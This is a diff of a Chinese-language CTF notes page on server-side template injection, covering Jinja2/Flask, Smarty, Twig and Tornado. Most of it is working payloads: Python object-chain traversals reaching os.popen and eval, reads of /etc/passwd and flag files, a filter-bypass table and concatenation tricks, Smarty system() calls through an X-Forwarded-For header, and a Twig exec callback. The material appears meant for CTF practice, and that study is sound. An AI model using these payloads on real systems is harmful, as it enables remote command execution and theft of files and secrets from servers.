@@ -5,54 +5,121 @@
 [hideandseek](https://www.baidu.com/s?wd=hctf2018+hideandseek)
 
 - linux service 越权
-- [Python原型链污染+Flask Pin](../../../../../blog/text/docs/ctf/scripts/web/web_flask_pin_原型链污染.zip)
-- 非预期 unicode 绕过 \uxxxx 
+- [Python 原型链污染+Flask Pin](../../../../../blog/text/docs/ctf/scripts/web/web_flask_pin_原型链污染.zip)
+- 非预期 unicode 绕过 \uxxxx
 - 非预期 hex 绕过 \x32
 - python2 tphmap.py -u "url" [--level=3] --os-shell
 
-### ssti smarty
+## ssti bypass
 
-`[BJDCTF2020]The mystery of ip`
-`[CISCN2019 华东南赛区]Web11`
+| code                   | filter | bypass                      |
+| ---------------------- | ------ | --------------------------- |
+| `__init__.__globals__` | global | `__init__['__glob''als__']` |
+| `{{}}`                 | `{{`   | `{% %}`                     |
+|                        | `_`    | lipsum                      |
 
+## ssti 注入
+
+测试
+
+<pre>/hello?name=
+{% for i in range(10) %}
+{% print(i) %}
+{% endfor %}
+</pre>
+
+输出了结果，说明有漏洞
+
+```python
+/hello?name={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
+/hello?name={{"".__class__}} 返回str
+/hello?name={{"".__class__.__base__.__subclasses__()[302]}} # popen
+/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /app").read()}}
+/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}
+[].__class__.__base__.__subclasses__()[58].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag.txt').read()")
+# WarningMessage
+{{''.__class__.__base__.__subclasses__()[221].__init__['__glob''als__']['__builtins__']['eval']}}
+
+# python2 input漏洞
+__import__('os').popen('cat /flag.txt').read()
+## appconfig
+__class__.__init__.__globals__[app].config
+?err=pfn&back={0.__class__.__init__.__globals__}   # 等于 pnf.__class__.__init__.__globals__
+
+
+# __builtins__利用
+[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()
+[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()’)
+
+# linecache利用
+[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].popen('whoami’).read()
+[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].popen('whoami').read()
+[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').popen('ls').read()
+
+# sys利用
+[].__class__.__mro__[1].__subclasses__()[58].__init__.__globals__['sys'].modules['os'].popen('whoami').read()
 ```
-{if phpinfo()}{/if}
-{if system('ls')}{/if}
-{ readfile('/flag') }
-{if show_source('/flag')}{/if}
-{if system('cat /flag')}{/if} #本题payload
-{if system('cat ../../../flag')}{/if} #本题payload
-X-Forwarded-For: {{system("ls")}}
-X-Forwarded-For: {{system("cat /flag")}} #本题payload
+
+### 万能语句
+
+```python
+{% for c in [].__class__.__base__.__subclasses__() %}
+    {% if c.__name__ == 'catch_warnings' %}
+        {% for b in c.__init__.__globals__.values() %}
+            {% if b.__class__ == {}.__class__ %}
+                {% if 'eva'+'l' in b.keys() %}
+                    {{ b['eva'+'l']('__impor'+'t__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()') }}
+                {% endif %}
+            {% endif %}
+        {% endfor %}
+    {% endif %}
+{% endfor %}
 ```
 
-### ssti 服务器模板注入 twig
-
-```
-user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
-```
-
-### ssti 服务器模板注入 jinja2 - payload
+方式 2
 
 ```py
-{{url_for['__glob'~'als__']}}
-{{url_for['__glob'~'als__']['__built'~'ins__']['eval']("next(open('/flag'))")}}
-{{url_for['__glob'~'als__']['os']['popen']("cat *")['read']()}}
-
-{{ config.__class__.__init__.__globals__['os'].__getattribute__('popen')('ls /').read() }} 
-{{ config.__class__.__init__.__globals__['os'].__getattribute__('popen')('cat /this_is_the_fla""g.txt').read() }} 
+# 读取app.py  -- [GYCTF2020]FlaskApp
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
+# 读目录 ls/
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
+# 拼接大法
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
 ```
 
-### ssti 服务器模板注入 jinja2
+生产环境不要开 debug 模式
 
+## ssti 服务器模板注入 jinja2
 
 `buuoj [RootersCTF2019]l_<3_Flask`
 
 [[WesternCTF2018]shrine](https://www.cnblogs.com/Cl0ud/p/12316287.html)
 
-    {{self.__dict__}}
-    {{url_for.__globals__['current_app'].config}}
-    {{get_flashed_messages.__globals__['current_app'].config}}
+```py
+# request
+{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
+{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
+
+# url_for
+{{url_for['__glob'~'als__']}}
+{{url_for['__glob'~'als__']['__built'~'ins__']['eval']("next(open('/flag'))")}}
+{{url_for['__glob'~'als__']['os']['popen']("cat *")['read']()}}
+
+{{config.__class__.__init__.__globals__['os'].__getattribute__('popen')('ls /').read()}}
+{{config.__class__.__init__.__globals__['os'].__getattribute__('popen')('cat /this_is_the_fla""g.txt').read()}}
+
+# lipsum
+{{lipsum.__globals__['os'].popen('whoami').read()}}
+{{lipsum.__globals__.os.popen('whoami').read()}}
+{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
+
+# get_flashed_messages
+{{self.__dict__}}
+{{url_for.__globals__['current_app'].config}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
+```
 
 [pasecactf_2019_flask_ssti](https://guokeya.github.io/post/zIiwsY95N/)
 
@@ -74,7 +141,29 @@ ssti 方式
 看到secret_key
 ```
 
-### PIN 码
+## ssti smarty
+
+`[BJDCTF2020]The mystery of ip`
+`[CISCN2019 华东南赛区]Web11`
+
+```
+{if phpinfo()}{/if}
+{if system('ls')}{/if}
+{ readfile('/flag') }
+{if show_source('/flag')}{/if}
+{if system('cat /flag')}{/if} #本题payload
+{if system('cat ../../../flag')}{/if} #本题payload
+X-Forwarded-For: {{system("ls")}}
+X-Forwarded-For: {{system("cat /flag")}} #本题payload
+```
+
+## ssti 服务器模板注入 twig
+
+```
+user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
+```
+
+## PIN 码
 
 debug 开启 才有 PIN 码问题
 
@@ -101,57 +190,7 @@ os.popen('cat /app/flag').read()
 ## 也可以写个反向shell，拿到更多权限。
 ```
 
-### ssti 注入
-
-测试
-
-<pre>/hello?name=
-
-{% for i in range(10) %}
-
-{% print(i) %}
-
-{% endfor %}
-
-</pre>
-
-输出了结果，说明有漏洞
-
-```python
-/hello?name={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
-/hello?name={{"".__class__}} 返回str
-/hello?name={{"".__class__.__base__}}
-/hello?name={{"".__class__.__base__.__subclasses__()}}
-/hello?name={{"".__class__.__base__.__subclasses__()[302]}} # popen
-/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__}}
-/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__}}
-/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls").read()}}
-/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /").read()}}
-/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /app").read()}}
-/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}
-[].__class__.__base__.__subclasses__()[58].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag.txt').read()")
-# python2 input漏洞
-__import__('os').popen('cat /flag.txt').read()
-### appconfig
-__class__.__init__.__globals__[app].config
-?err=pfn&back={0.__class__.__init__.__globals__}   # 等于 pnf.__class__.__init__.__globals__
-```
-
-方式 2
-
-```py
-# 读取app.py  -- [GYCTF2020]FlaskApp
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
-# 读目录 ls/
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
-# 拼接大法
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
-```
-
-生产环境不要开 debug 模式
-
-### ssti 注入\_tornado
+## ssti 注入\_tornado
 
 [2018 护网杯 easy_tornado(BUUCTF 提供复现)](https://blog.csdn.net/zz_Caleb/article/details/101473013)
 
@@ -190,4 +229,5 @@ filehash: md5(cookie_secret+md5(filename))
 ```
 
 ## Article
-[Python沙箱逃逸-离线也有](https://mp.weixin.qq.com/s/_cYKlPzUgokvJ17ZVRhMxw)
+
+[Python 沙箱逃逸-离线也有](https://mp.weixin.qq.com/s/_cYKlPzUgokvJ17ZVRhMxw)
